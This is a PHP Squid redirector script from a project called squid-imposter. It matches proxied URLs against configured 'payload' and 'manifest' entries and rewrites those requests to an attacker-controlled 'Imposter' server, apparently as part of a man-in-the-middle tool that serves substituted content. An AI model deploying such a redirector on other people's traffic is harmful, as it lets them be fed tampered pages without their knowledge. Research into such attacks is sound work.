#!/usr/bin/php
<?php
/**
 * Redirecting script - this file checks for URL matching config.ini entries
 * and redirects those URLs to Imposter server
 *
 * This file is a part of squid-imposter project.
 * @author Krzysztof Kotowicz <kkotowicz at gmail dot com>
 */
ini_set('display_errors', true);
set_error_handler('error_handler');
$cfg = read_config_file();
// do_log("Started");
while ($input = fgets(STDIN)) {

    if (!empty($cfg['test_mode'])) // refresh config file at each request
        $cfg = read_config_file();

    // Split the output (space delimited) from squid into an array.
    $line = explode(' ', $input);

    $url = trim($line[0]);

    if (count($line) >= 4) {
        $ip_fqdn = $line[1];
        $user = $line[2];
        $method = $line[3];
    }

    $elements = array('payload', 'manifest');

    foreach ($cfg as $site_id => $site) {
        foreach ($elements as $element) {
            if ($match = url_matches($url, $site, $element)) {
                if (empty($site[$element])) {
                   $site[$element] = !empty($match[1]) ? $match[1] : $match[0]; // correct url in case of match
                }
                $params = array(
                  'site' => $site_id,
                  'url' => $url,
                  'match' => $match,
                  'payload' => !empty($site['payload']) ? $site['payload'] : '',
                  'manifest' => !empty($site['manifest']) ? $site['manifest'] : '',
                  'show' => $element,
                );

                $url = $cfg['config']['imposter'] . '?' . http_build_query($params, '', '&');
                do_log(trim($input) . ' -> ' . $url);
                break 2;
            }
        }
    }

    echo  $url . "\n";
}

/**
 * In case of any error, redirect to a dummy page with error details
 */
function error_handler($errno, $errstr, $errfile, $errline) {
    global $cfg, $url;
    do_log("Error at line $errline - $errstr. URL: $url");
    if (!empty($cfg['config']['test_mode'])) {
	// return error msg to client
	echo '301:http://error-at-line-' . (int) $errline . '/' . urlencode($errstr) . "\n";
    } else {
	echo $url."\n"; // fail silently
    }    
    die();
}

function read_config_file() {
    return parse_ini_file(dirname(__FILE__) . '/payloads/config.ini', true);
}

/**
 * Checks if URL matches given site element
 *
 * @param string $url
 * @param array $site
 * @param string $element
 */
function url_matches($url, $site, $element) {

    if (!empty($site[$element . '_match'])) {
        // match URL to a regular expression
        // Caution: be sure to test the regex!
        $pattern = $site[$element . '_match'];

        $match = array();
        if (preg_match($pattern, $url, $match)) {
            return $match;
        }
        return false;
    }

    if (empty($site[$element]))
        return false;
        
    if (substr($site[$element], 0, 1) == '/') { // domain relative url
        $m = array();
	if (preg_match('#(https?://.*?)/#', $url, $m)) {
	    $site[$element] = $m[1] . $site[$element]; // prepend current domain
	}
    }

    return ($url == $site[$element]) ? array($url) : false; // simple string matching
}

//do_log("Exit");

function do_log($s) {
    global $cfg;
    if (!empty($cfg['config']['logfile'])) {
	file_put_contents(dirname(__FILE__) . '/' . $cfg['config']['logfile'], date("[Y-m-d H:i:s]") .' ' . $s . "\n", FILE_APPEND);
    }
}